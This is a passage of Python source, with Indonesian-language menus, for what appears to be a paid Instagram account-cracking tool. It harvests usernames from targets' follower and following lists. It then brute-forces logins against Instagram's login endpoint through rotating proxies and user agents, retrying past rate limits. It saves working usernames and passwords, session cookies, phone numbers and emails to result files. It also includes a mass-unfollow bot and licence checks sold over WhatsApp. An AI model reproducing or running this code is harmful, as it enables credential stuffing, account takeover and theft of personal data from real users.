					#	prints(Panel(f'\r{P2}[{K2}X{P2}]USERNAME : {K2}{user}\n{P2}[{K2}X{P2}]PASSWORD : {K2}{pw}\n{P2}[{K2}X{P2}]PENGIKUT : {K2}{pengikut}\n{P2}[{K2}X{P2}]MENGIKUT : {K2}{mengikut}\n{P2}[{K2}X{P2}]POSTINGAN : {K2}{postingan}',title=f" {K2}IDIN|CP ",width=80,padding=(0,4),style=f"bold yellow"))
					#	prints(Panel(f'\r{P2}[{K2}X{P2}] Nama      : {K2}{nama}                \n{P2}[{K2}X{P2}] Username  :{K2} {user}                \n{P2}[{K2}X{P2}] Password  :{K2} {pw}                \n{P2}[{K2}X{P2}] Pengikut  : {K2}{pengikut}                \n{P2}[{K2}X{P2}] Mengikuti : {K2}{mengikut}                \n{P2}[{K2}X{P2}] Postingan : {K2}{postingan}',title=f"{K2}CHECKPOINT",width=80,padding=(0,4),style=""))
						print("")
						open(f"result/checkpoint/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
						checkpoint.append(user)
						open('.logCrack','a').write(f'{K}╭({K}{loop}{K}) {K}{user} {K}|| {K}{pw}\n{K}╰{K}{respon.text}\n')
						break
					elif 'ip_block' in str(respon.text) or 'spam' in str(respon.text):
						prog.update(des,description=f"{M2}[SPAM][/] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
						prog.advance(des)
						time.sleep(10);self.crackAPI(user,pas)
						open('.logCrack','a').write(f'{M}╭({loop}) {user} || {pw}\n╰{respon.text}\n{N}\n')
						loop-=1
						break
					else:open('.logCrack','a').write(f'{N}╭({loop}) {user} || {pw}\n╰{respon.text}\n{N}\n')
				except requests.exceptions.ConnectionError:
					prog.update(des,description=f"{M2}[SPAM][/] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
					prog.advance(des)
					time.sleep(5)
					self.crackAPI(user,pas)
					loop-=1
					break
		loop+=1
		
	def ua_ig(self):
		rr=random.randint
		rc=random.choice
		return (f"Mozilla/5.0 (iPad; CPU OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;WeRead/4.1.3 (iPad; iOS 12.3.1; Scale/2.00)")
		return (f"Mozilla/5.0 (iPad; CPU OS 17_3_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) 1Password/7.10.2 (like Version/17.3.1 Mobile/21D61 Safari/600.1.4)")
		return (f"Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 GoogleApp/14.25.13.28.arm")
		return (f"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36")
		return (f"Mozilla/5.0 (Linux; Android 12; V2111) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36")
		return (f"Mozilla/5.0 (Linux; Android 13; 21091116UG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.210 Mobile Safari/537.36 Instagram 314.0.0.20.114 Android (33/13; 440dpi; 1080x2276; Xiaomi/Redmi; 21091116UG; pissarropro; mt6877; en_US; 556277190)")
		return (f"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 232.0.0.12.114 (iPhone13,3; iOS 15_4_1; ru_KG; ru-KG; scale=3.00; 1170x2532; 365562048)")
		
	def checkAPI(self,user,pw):
		ses=requests.Session()
		ncek=random.randint(1000000000, 99999999999)
		ts = calendar.timegm(current_GMT)
		nip=random.choice(prox)
		proxs= {'http': 'socks4://'+nip}
		ua = self.ua_sam_idin()
		try:
			p=ses.get('https://www.instagram.com/web/__mid')
			ses.headers.update({
                    'Host':'www.instagram.com',
                    'x-ig-www-claim':'0',
                    'x-instagram-ajax':'6543adcc6d29',
                    'content-type':'application/x-www-form-urlencoded',
                    'accept':'*/*',
                    'x-requested-with':'XMLHttpRequest',
                    'x-asbd-id':'198387',
                     'user-agent':ua,
                     'x-csrftoken':p.cookies['csrftoken'],
                     'x-ig-app-id':'1217981644879628',
                     'origin':'https://www.instagram.com',
                     'sec-fetch-site':'same-origin',
                     'sec-fetch-mode':'cors',
                     'sec-fetch-dest':'empty',
                     'referer':'https://www.instagram.com/accounts/login/',
                     'accept-encoding':'gzip, deflate',
                     'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			data = {
           "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pw}",
			"username": user,
			"queryParams": "{}",
			"optIntoOneTap": False,
			"stopDeletionNonce": "",
			"trustedDeviceRecords": "{}"}
			respon=ses.post("https://www.instagram.com/accounts/login/ajax/", data=data, proxies = proxs, allow_redirects=True)
			ncek=json.loads(respon.text)
			if 'userId' in str(ncek):
				nama,pengikut,mengikut,postingan=self.APIinfo(user)
				cookie = ";".join([key+"="+value.replace('"','') for key, value in ses.cookies.get_dict().items()])
				nomo, email = self.INFOdata(cookie)
				print(f"\n{P} [ NAMA ] : {HI}{user} {P}<=> {HI}SUKSES🔥\n{P} [ PASSWORD ] : {HI}{pw} {P}<=> {HI}SUKSES🔥\n{P} [ PENGIKUT ] : {HI}{pengikut} {P}<=> {HI}SUKSES🔥\n{P} [ MENGIKUTI ] : {HI}{mengikut} {P}<=> {HI}SUKSES🔥\n{P} [ POSTINGAN ] : {HI}{postingan} {P}<=> {HI}SUKSES🔥")
			#	Idin_Panel(Idin_gg(f"\r{P2}[{H2}✓{P2}]NAMA      : {H2}{nama}\n{P2}[{H2}✓{P2}]USERNAME  : {H2}{user}\n{P2}[{H2}✓{P2}]PASSWORD  : {H2}{pw}\n{P2}[{H2}✓{P2}]PENGIKUT  : {H2}{pengikut}\n{P2}[{H2}✓{P2}]MENGIKUT  : {H2}{mengikut}\n{P2}[{H2}✓{P2}]POSTINGAN : {H2}{postingan}\n{P2}[{H2}✓{P2}]NOMOR     : {H2}{nomo}\n{P2}[{H2}✓{P2}]EMAIL     : {H2}{email}\n{P2}[{H2}✓{P2}]COOKIE    : {H2}{cookie}\n{P2}[{H2}✓{P2}]UA IDIN   : {N2}{ua}",style=f"bold green"))
	#			open(f"stokakunig.txt","a").write(f'USERNAME : {user}\nPASSWORD : {pw}\nPENGIKUT : {pengikut}\nPOSTINGAN : {postingan}\n')
			elif 'checkpoint_url' in str(ncek):
				nama,pengikut,mengikut,postingan=self.APIinfo(user)
				Idin_Panel(Idin_gg(f"\r{P2}[{K2}X{P2}]{P2}USERNAME      : {K2}{user}\n{P2}[{K2}X{P2}]{P2}PASSWORD      : {K2}{pw}\n{P2}[{K2}X{P2}]{P2}PENGIKUT      : {K2}{pengikut}\n{P2}[{K2}X{P2}]{P2}MENGIKUT      : {K2}{mengikut}\n{P2}[{K2}X{P2}]{P2}POSTINGAN     : {K2}{postingan}",style=f"bold yellow"))
			#	open(f"result/checkpoint/-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
			elif 'Please wait a few minutes' in str(respon.text):
				sys.stdout.write(f"\r{M} ! terkena spam, aktifkan mode pesawat ");sys.stdout.flush();sleep(10)
			else:
				nama,pengikut,mengikut,postingan=self.APIinfo(user)
				print(f"\n{P} [ NAMA ] : {M}{user} {P}<=> {K}CHECKPOINT💥\n{P} [ PASSWORD ] : {M}{pw} {P}<=> {K}CHECKPOINT💥\n{P} [ PENGIKUT ] : {M}{pengikut} {P}<=> {K}CHECKPOINT💥\n{P} [ MENGIKUTI ] : {M}{mengikut} {P}<=> {K}CHECKPOINT💥")
				#Idin_Panel(Idin_gg(f"\r{P2}[{M2}X{P2}]{P2}USERNAME      : {M2}{user}\n{P2}[{M2}X{P2}]{P2}PASSWORD      : {M2}{pw}\n{P2}[{M2}X{P2}]{P2}PENGIKUT      : {M2}{pengikut}\n{P2}[{M2}X{P2}]{P2}MENGIKUT      : {M2}{mengikut}\n{P2}[{M2}X{P2}]{P2}POSTINGAN     : {M2}{postingan}",title=f"{K2}PW DI UBAH",width=80,padding=(0,4),style=""))
		except requests.ConnectionError:
			sys.stdout.write(f"\r{M} ! terkena spam, aktifkan mode pesawat ");sys.stdout.flush();sleep(10)
		except Exception as e:prints(e)
			#self.checkAPI(user,pw) 	 
	def cek_hasil(self):
		no,nom = 0,[]
		urut = []
		prints(Panel(f"\t    {M2}!!!{hapus} Cek Hasil Akun Crack", padding=(0,4),style=f"{color_table}"))
		urut.append(Panel(f"{P2}[{H2}1{P2}] Cek hasil akun {H2}success{hapus}",padding=(0,5),style=f"{color_table}"))
		urut.append(Panel(f"{P2}[{H2}2{P2}] Cek hasil akun {K2}checkpoint{hapus}",padding=(0,5),style=f"{color_table}"))
		self.tol.print(Columns(urut))
		one=input("Pilihanmu : ")
		if one in ['1','01']:
			try:ok = os.listdir('result/success/')
			except:prints(f" [{M2}!{hapus}] tidak ada hasil success");time.sleep(1);self.menu()
			for x in ok:
				nom.append(x)
				no+=1
				try:jum= open('result/success/'+x,'r').readlines()
				except:continue
				print(f' [{H}{no}{N}] {x} - {H}{len(jum)} {N}akun')
			abc = input(f' [{H}?{N}] nomor file : ')
			file = nom[int(abc)-1]
			try:buka = open('result/success/'+file,'r').read()
			except:prints(f" [{M2}!{hapus}] tidak hasil success");time.sleep(1);self.menu()
			print("")
			print( H+buka+N)
			input(f'\n[{H}!{N}] tekan enter untuk kembali');self.menu()
		elif one in ['2','02']:
			try:ok = os.listdir('result/checkpoint/')
			except:prints(f" [{M2}!{hapus}] tidak hasil success");self.menu()
			for x in ok:
				nom.append(x)
				no+=1
				try:jum= open('result/checkpoint/'+x,'r').readlines()
				except:continue
				print(f' [{K}{no}{N}] {x} - {K}{len(jum)} {N}akun')		
			abc = input(f' [{H}?{N}] nomor file : ')
			file = nom[int(abc)-1]
			try:buka = open('result/checkpoint/'+file,'r').read()
			except:prints(f" [{M2}!{hapus}] tidak hasil checkpoint");time.sleep(1);self.menu()
			print("")
			print( K+buka+N)
			input(f'\n[{H}!{N}] tekan enter untuk kembali');self.menu()
		else:print(f" [{M}!{N}] isi yang benar");time.sleep(2);self.menu()
		
	def menu(self):
		self.logo()
		prints(Panel(f"""\t {P2}Ketik {M2}Bug {P2}Untuk Melaporkan Bug Script""",width=80,padding=(0,7),style=f"bold green"))
		c=input(f'•{N} Pilih :{C}  ')
		if c=='':
			self.menu()
		elif c in ('1','01'):
			prints(Panel(f"{P2}Crack Dari Pencarian Nama",width=80,padding=(0,2),style=f"{color_table}"))
			nama=input(f'{N} • Masukan nama :{N} ')
			pr=f"Tekan {M2}CTRL + C{hapus} Untuk Berhenti Dump Username"
			so=nel(pr,style="")
			sol().print(so)
			name=self.searchAPI(self.cookie,nama)
			self.passwordAPI(name)
		elif c in ('2','02'):
			prints(Panel(f"{P2}Crack Dari Pengikut",width=80,padding=(0,2),style=f"bold green"))
			#massal(self)
			mas=input('• Apakah anda ingin crack masal? y/t >  ')
			if mas in ['y','Y']:
				masal(self)
			elif mas in ['t','T']:
				massal(self)
			elif mas in ['']:
				print('ISI JANGAN KOSONG KENTOD!')
		elif c in ('3','03'):
			prints(Panel(f"{P2}Crack Dari Mengikut",width=80,padding=(0,2),style=f"bold green"))
			mas=input('• Apakah anda ingin crack masal? y/t >  ')
			if mas in ['y','Y']:
				mengi(self)
			elif mas in ['t','T']:
				meng(self)
			elif mas in ['']:
				print('ISI JANGAN KOSONG KENTOD!')
		elif c in ('4','04'):
			print('')
			for i in os.listdir('result/checkpoint/'):
				print(f' [{U}!{C}] {i}')
			c=input(f'\n [{CY}?{N}] Masukan nama file: {C}')
			g=open("result/checkpoint/%s"%(c)).read().splitlines()
			print(f'\n{CY} [+] Total Result {H}{len(g)}{C}')
			print(f'\n{CY}┣[!] Proses mengecek status akun. silahkan tunggu sebentar{C}\n')
			for s in g:
				user=s.split('|')[0]
				pwd=s.split('|')[1]
				self.checkAPI(user,pwd)
			wel='# CRACK ULANG SELESAI'
			cik2=mark(wel ,style='green')
			sol().print(cik2)
			exit()
		elif c in ('5','05'):
			self.cek_hasil()
		elif c in ('6','06'):
			global following
			six=0
			print(f'\n [{U}!{C}] Bot Unfollow-All Dijalankan\n')
			nama="unfollow"
			x=open('.kukis.log','r').read()
			x_id=re.findall('sessionid=(\d+)',x)[0]
			back=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100',x_id,nama)
			for i in following:
				six+=1
				sleep(float( random.uniform(nyMnD*10,nyMxD*10) / 10 ))
				six_id=self.sixAPI(i)
				print(f' {str(six)}{U} {C} {i} {H}Unfollow-Berhasil{C}')
				self.unfollowAPI(six_id,'5452333948',self.cookie)
				#print(w)
			input(f'\n\n [{U}#{C}] Unfollow-all selesai...');self.menu()
		elif c in ('lain','Lain'):
			ganti_tema()
		elif c in ('bug','Bug','BUG'):
			self.BUG()
		elif c in ('c','C'):
			self.ChangeLog()
		elif c in ('e','E'):
			self.Exit()
		else:
			self.menu()
def tlisensi():
    lu()
    cetak(nel('[!] Lisensi Tidak Valid\n[!] Silahkan Ketik [green]"Buy"[/green] Untuk membeli lisensi'))
    time.sleep(2)
    lisen=input('[•] Masukan Lisensi : ')
    if lisen in ['']:
     print(f'{M}[!] JANGAN KOSONG{N}');sleep(1)
     tlisensi()
    if lisen in ['buy','Buy']:
     os.system('xdg-open https://wa.me/6283114591358?text=Bang+beli+lisensi+IG+nya+dong');exit()
    loadinglisen()
    open('.lisen.txt','w').write(lisen)
    lisensi()   
def lisensi():
 try:
  cek=open('.lisen.txt').read()
  lisensikuni.append(cek)
 except:
  tlisensi()
 ses=requests.Session()
 res=ses.get('https://app.cryptolens.io/api/key/Activate?token=WyIyODk1MzkwMyIsImVUdmdBNEZpL0RyVEFReFFwVTBhMzhaelBIaHZJbHhWQkZSSUdHRVoiXQ==&ProductId=17514&Key='+lisensikuni[0]).json()
 status=res['licenseKey']['key']
 if status ==cek:
  li()
  cetak(nel('\t[green] SELAMAT LISENSI ANDA VALID[/green]'))
  time.sleep(2)
  lisensiku.append("sukses")
  login_kamu()
 elif status ==KeyError:
  os.system('rm .lisen.txt')
 else:
  tlisensi()
def mengi(self):
			try:
				menudump.append('mengikuti')
				prints(Panel(f"{P2}Pastikan Target Bersifat Publik {M2}!!!!",width=80,padding=(0,2),style=f"bold green"))
				m=int(input(f'{N}•{N} Masukan jumlah target: {N}'))
			except:m=1
			for t in range(m):
				t +=1
				print('\r')
				prints(Panel(f"{P2}Total Username Terkumpul : {H2}{len(internal)}",width=80,padding=(0,20),style=f"bold green"))
				nama=input(f' [{t}] Masukan Username : ')
				prints(Panel(f"[white]Tekan [red]CTRL + C[white] Untuk Berhenti",width=80,padding=(0,4),style=f"bold green"))
				id=self.idAPI(self.cookie,nama)
				info=self.ifoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100',id,nama)
			self.passwordAPI(info)
def meng(self):
			menudump.append('mengikuti')
			prints(Panel(f"{P2}Pastikan Target Bersifat Publik {M2}!!!!",width=80,padding=(0,2),style=f"bold green"))
			nama=input(f'{N}• Username target : {C}')
			prints(Panel(f"[white]Tekan [red]CTRL + C[white] Untuk Berhenti",width=80,padding=(0,4),style=f"bold green"))
			id=self.idAPI(self.cookie,nama)
			info=self.ifoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=200',id,nama)
			self.passwordAPI(info)
def masal(self):
			try:
				menudump.append('pengikut')
				prints(Panel(f"{P2}Pastikan Target Bersifat Publik {M2}!!!!",width=80,padding=(0,2),style=f"bold green"))
				m=int(input(f'{H}•{H} Masukan jumlah target: {N}'))
			except:m=1
			for t in range(m):
				t +=1
				print(f"[white]Total Username Terkumpul : [green]{len(internal)}")
				nama=input(f'{N}• Masukan Username : ')
				prints(Panel(f"[white]Tekan [red]CTRL + C[white] Untuk Berhenti",width=80,padding=(0,4),style=f"bold green"))
				id=self.idAPI(self.cookie,nama)
				info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=200',id,nama)
			self.passwordAPI(info)
def massal(self):
			menudump.append('pengikut')
			prints(Panel(f"{P2}Pastikan Target Bersifat Publik {M2}!!!!",width=80,padding=(0,2),style=f"bold green"))
			m=input(f'{N}• Username target : {C}')
			prints(Panel(f"[white]Tekan [red]CTRL + C[white] Untuk Berhenti",width=80,padding=(0,4),style=f"bold green"))
			id=self.idAPI(self.cookie,m)
			info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=200',id,m)
			self.passwordAPI(info)
			
def register_device():
	while True:
		clear()
		banner()
		if os.path.exists("/data/data/com.termux/files/usr/etc/.license"):
			key = open("/data/data/com.termux/files/usr/etc/.license","r").read()
			check = requests.get("https://pastebin.com/raw/83EMYMa2").text
			if key in check:
				clear()
				banner()
				lisensiku.append("sukses")
				cetak(nel(f" {H2} Key anda telah di konfirmasi ✓{hapus}"))
				time.sleep(1.5)
				login_kamu()
			else:
				pr=(f'# YOUR KEY : {key}')
				po=mark(pr,style='red')
				cetak(nel(po, style= ''))
				cetak(nel(f"[•] {M2}Key anda belum di konfirmasi{hapus}\n[•] {M2}Silahkan Beli Ke Wa {hapus}{H2}+6283114591358{hapus}{M2} untuk menggunakan sc{hapus}"))
				buy_key=input('  Tekan enter untuk chat whatsapp author untuk membeli key')
				if buy_key in [""]:pass
				jalan(f'  Anda akan diarahkan ke whatsapp author');time.sleep(2)
				os.system(f'xdg-open http://wa.me/+6283114591358?text=Bang+beli+key+sc+instagram+{key}')

		if not os.path.exists("/data/data/com.termux/files/usr/etc/.license"):
			key_gen = random.randint(10000000,99999999)
			enc_key = base64.b16encode(str(key_gen).encode()).decode("utf-8")
			with open("/data/data/com.termux/files/usr/etc/.license","w") as tulis:
				tulis.write(enc_key)
			
			continue
		
		break

if __name__=='__main__':
	ses=requests.Session()
	try:os.mkdir('result')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('mkdir result/success')
	except:pass
	try:os.system('mkdir result/checkpoint')
	except:pass
	try:
		with requests.Session() as ses:
	         ko = ses.get('https://pastebin.com/raw/fnqH31za').json()
	         HARIS.update(ko)
	         ki = ses.get('https://pastebin.com/raw/KnuN98sB').json()
	         HARIS1.update(ki)
	         os.system("git pull")
	         login_kamu()
	except Exception as e:
		prints(e)